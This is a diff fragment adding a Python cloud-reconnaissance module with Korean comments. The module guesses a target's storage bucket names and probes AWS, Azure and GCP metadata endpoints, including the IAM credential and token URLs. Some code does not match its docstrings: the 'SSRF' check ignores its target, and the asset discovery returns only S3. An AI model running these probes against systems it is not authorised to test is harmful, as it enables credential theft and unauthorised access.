+        response = requests.get(url, timeout=5, allow_redirects=False)
+        if response.status_code in [200, 403]:
+            azure_info["exists"] = True
+            azure_info["public"] = (response.status_code == 200)
+    except:
+        pass
+    
+    return azure_info
+
+
+def check_gcp_storage(bucket_name: str) -> Dict[str, Any]:
+    """
+    Google Cloud Storage 접근 가능 여부 확인
+    
+    Returns:
+        {
+            "exists": True,
+            "public": True
+        }
+    """
+    gcp_info = {
+        "exists": False,
+        "public": False
+    }
+    
+    url = f"https://storage.googleapis.com/{bucket_name}"
+    
+    try:
+        response = requests.get(url, timeout=5, allow_redirects=False)
+        if response.status_code in [200, 403]:
+            gcp_info["exists"] = True
+            gcp_info["public"] = (response.status_code == 200)
+    except:
+        pass
+    
+    return gcp_info
+
+
+def discover_cloud_assets(target: str) -> Dict[str, Any]:
+    """
+    클라우드 자산 발견 (S3, Azure, GCP)
+    
+    Args:
+        target: 타겟 도메인 (예: "example.com")
+    
+    Returns:
+        {
+            "s3_buckets": [...],
+            "azure_blobs": [...],
+            "gcp_buckets": [...],
+            "cloud_technologies": [...]
+        }
+    """
+    logger.info("클라우드 자산 발견 시작")
+    
+    cloud_technologies = []
+    
+    # 도메인에서 추출 가능한 버킷 이름 패턴
+    domain_parts = target.replace("www.", "").split(".")
+    base_name = domain_parts[0] if domain_parts else target
+    
+    # 일반적인 버킷 이름 패턴
+    bucket_candidates = [
+        base_name,
+        f"{base_name}-backup",
+        f"{base_name}-dev",
+        f"{base_name}-staging",
+        f"{base_name}-prod",
+        f"{base_name}-test",
+        f"{base_name}-assets",
+        f"{base_name}-static",
+    ]
+    
+    s3_buckets = []
+    for bucket_name in bucket_candidates[:5]:  # 처음 5개만 체크
+        s3_info = check_s3_bucket(bucket_name)
+        if s3_info["exists"]:
+            # 버킷 정책 및 ACL 분석
+            policy_info = analyze_s3_bucket_policy(bucket_name)
+            
+            s3_buckets.append({
+                "name": bucket_name,
+                "public": s3_info["public"],
+                "policy_info": policy_info
+            })
+            
+            tech_info = {
+                "type": "cloud_storage",
+                "name": f"AWS S3: {bucket_name}",
+                "source": "Cloud Asset Discovery",
+                "public": s3_info["public"]
+            }
+            
+            # 보안 이슈가 있으면 추가
+            if policy_info.get("security_issues"):
+                tech_info["security_issues"] = policy_info["security_issues"]
+                tech_info["risk"] = "HIGH" if any(issue.get("severity") in ["HIGH", "CRITICAL"] for issue in policy_info["security_issues"]) else "MEDIUM"
+            
+            cloud_technologies.append(tech_info)
+    
+    return {
+        "s3_buckets": s3_buckets,
+        "cloud_technologies": cloud_technologies
+    }
+
+
+def check_cloud_metadata(target: str) -> Dict[str, Any]:
+    """
+    클라우드 메타데이터 서비스 확인 (SSRF 시뮬레이션)
+    AWS, Azure, GCP 메타데이터 엔드포인트 체크
+    
+    Returns:
+        {
+            "aws_metadata": {...},
+            "azure_metadata": {...},
+            "gcp_metadata": {...}
+        }
+    """
+    metadata_info = {
+        "aws_metadata": {"accessible": False, "endpoint": None},
+        "azure_metadata": {"accessible": False, "endpoint": None},
+        "gcp_metadata": {"accessible": False, "endpoint": None}
+    }
+    
+    metadata_endpoints = {
+        "aws": [
+            "http://169.254.169.254/latest/meta-data/",
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        ],
+        "azure": [
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01"
+        ],
+        "gcp": [
+            "http://metadata.google.internal/computeMetadata/v1/",
+            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+        ]
+    }
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0",
+        "Metadata-Flavor": "Google"  # GCP용
+    }
+    
+    # AWS 메타데이터 확인
+    try:
+        for endpoint in metadata_endpoints["aws"]:
+            try:
+                resp = requests.get(
+                    endpoint,
+                    timeout=3,
+                    verify=False,
+                    headers={"User-Agent": "Mozilla/5.0"}
+                )
+                if resp.status_code == 200:
+                    metadata_info["aws_metadata"]["accessible"] = True
+                    metadata_info["aws_metadata"]["endpoint"] = endpoint
+                    break
+            except:
+                continue
+    except:
+        pass
+    
+    # Azure 메타데이터 확인
+    try:
+        for endpoint in metadata_endpoints["azure"]:
+            try:
+                resp = requests.get(
+                    endpoint,
+                    timeout=3,
+                    verify=False,
+                    headers={"Metadata": "true", "User-Agent": "Mozilla/5.0"}
+                )
+                if resp.status_code == 200:
+                    metadata_info["azure_metadata"]["accessible"] = True
+                    metadata_info["azure_metadata"]["endpoint"] = endpoint
+                    break
+            except:
+                continue
+    except:
+        pass
+    
+    # GCP 메타데이터 확인
+    try:
+        for endpoint in metadata_endpoints["gcp"]:
+            try:
+                resp = requests.get(
+                    endpoint,
+                    timeout=3,
+                    verify=False,
+                    headers={"Metadata-Flavor": "Google", "User-Agent": "Mozilla/5.0"}
+                )
+                if resp.status_code == 200:
+                    metadata_info["gcp_metadata"]["accessible"] = True
+                    metadata_info["gcp_metadata"]["endpoint"] = endpoint
+                    break
+            except:
+                continue
+    except:
+        pass
+    
+    return metadata_info
+
+
+def collect_cloud_info(target: str) -> Dict[str, Any]:
+    """
+    클라우드 인프라 정보 종합 수집
+    
+    Args:
+        target: 타겟 도메인
+    
+    Returns:
+        {
+            "cloud_assets": {...},
+            "cloud_technologies": [...],
+            "metadata_info": {...}
+        }
+    """
+    cloud_assets = discover_cloud_assets(target)
+    
+    # 메타데이터 서비스 확인
+    metadata_info = check_cloud_metadata(target)
+    
+    # 메타데이터 접근 가능하면 기술 스택에 추가
+    if metadata_info["aws_metadata"]["accessible"]:
+        cloud_assets["cloud_technologies"].append({
+            "type": "cloud_metadata",
+            "name": "AWS Metadata Service",
+            "source": "Metadata Service Check",
+            "accessible": True,
+            "risk": "CRITICAL"
+        })
+    
+    if metadata_info["azure_metadata"]["accessible"]:
+        cloud_assets["cloud_technologies"].append({
+            "type": "cloud_metadata",
+            "name": "Azure Metadata Service",
+            "source": "Metadata Service Check",
+            "accessible": True,
+            "risk": "CRITICAL"
+        })
+    
+    if metadata_info["gcp_metadata"]["accessible"]:
+        cloud_assets["cloud_technologies"].append({
+            "type": "cloud_metadata",
+            "name": "GCP Metadata Service",
+            "source": "Metadata Service Check",
+            "accessible": True,
+            "risk": "CRITICAL"
+        })
+    
+    return {
+        "cloud_assets": cloud_assets,
+        "cloud_technologies": cloud_assets.get("cloud_technologies", []),
+        "metadata_info": metadata_info
+    }
+```
+
+--------------------------------------------------------------------------------
